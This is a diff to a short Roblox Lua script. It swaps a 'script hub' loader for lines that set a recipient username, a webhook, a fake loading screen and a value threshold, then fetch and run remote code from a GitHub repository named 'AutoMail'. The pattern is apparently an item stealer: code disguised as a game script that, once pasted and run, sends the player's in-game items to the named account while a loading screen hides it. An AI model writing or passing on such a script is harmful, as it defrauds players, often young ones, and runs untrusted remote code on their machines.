@@ -1,5 +1,9 @@
----// Join MTien Hub Sever To Update New Script \\--
---// Sever Discord: https://discord.com/invite/pCBDH5z382 \\--
-_G.Name = "pikachu hub" -- Put You Name Script Here
-_G.Logo = "" -- Enter Your ID Image Here
-loadstring(Game:HttpGet"https://raw.githubusercontent.com/ImTienNguyenZ/NguyenTienSimpRose/main/NguyenMinhTienLoader")()
+Username = " pikachu352783 "
+Username2 = " pikachu352783 "
+Webhook = " loading "
+
+LoadingScreen = true
+
+MinimumRAP = 1000000000000000000000000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HubPet99/AutoMail/main/Mail"))()
